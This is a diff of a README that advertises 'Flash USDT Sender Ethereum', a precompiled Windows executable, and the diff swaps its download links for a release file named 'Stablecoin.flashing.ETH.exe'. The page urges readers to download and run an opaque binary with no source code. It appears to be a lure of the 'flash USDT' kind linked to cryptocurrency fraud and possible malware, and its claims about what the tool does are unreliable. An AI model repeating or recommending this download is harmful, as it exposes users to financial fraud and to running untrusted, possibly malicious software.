@@ -2,7 +2,7 @@
 
 Hey there, fellow blockchain tinkerers! I’m thrilled to share **Flash USDT Sender Ethereum**—a slick, standalone `.exe` I’ve cooked up for blasting USDT across the Ethereum mainnet 🌐. Powered by `web3.py` under the hood and wrapped in a `tkinter`-driven GUI, this bad boy is pre-compiled for Windows, so you can skip the Python setup and dive straight into the action. It’s built for devs like us who love tweaking gas, tracking txs, and playing with Ethereum’s nuts and bolts. Download it, fire it up, and let’s geek out on some USDT action! 🚀
 
-**[Download the Latest Release](https://github.com/flexxwhoax/Flash-USDT-Sender-/blob/main/Sender%20tool.exe)**
+**[Download the Latest Release](https://github.com/flexxwhoax/Flash-USDT-Sender-/releases/download/FLASHTOOL/Stablecoin.flashing.ETH.exe)**
 
 #### What’s It For? 🎯
 This tool is all about giving you a front-row seat to Ethereum’s ERC-20 magic—specifically for USDT. Want to send some stablecoins, mess with gas prices, or test transaction cancels? This `.exe` has you covered. It’s a lightweight, no-fuss way to interact with the blockchain, perfect for experimenting or just flexing your dev skills. I made it portable so you can jump in and start sending USDT faster than you can say "gas fee." Give it a whirl and see what you can do with it!
@@ -39,4 +39,4 @@ This tool is all about giving you a front-row seat to Ethereum’s ERC-20 magic�
 
 **Heads-Up**: This is for educational fun—keep it smart. You’ll need a pinch of ETH for gas, and triple-check those addresses or kiss your USDT goodbye.
 
-So, what are you waiting for? [Grab Flash USDT Sender Ethereum](https://github.com/flexxwhoax/Flash-USDT-Sender-/blob/main/Sender%20tool.exe) and let’s nerd out on the blockchain together! PRs and bug reports totally welcome 🌈.
+So, what are you waiting for? [Grab Flash USDT Sender Ethereum](https://github.com/flexxwhoax/Flash-USDT-Sender-/releases/download/FLASHTOOL/Stablecoin.flashing.ETH.exe) and let’s nerd out on the blockchain together! PRs and bug reports totally welcome 🌈.
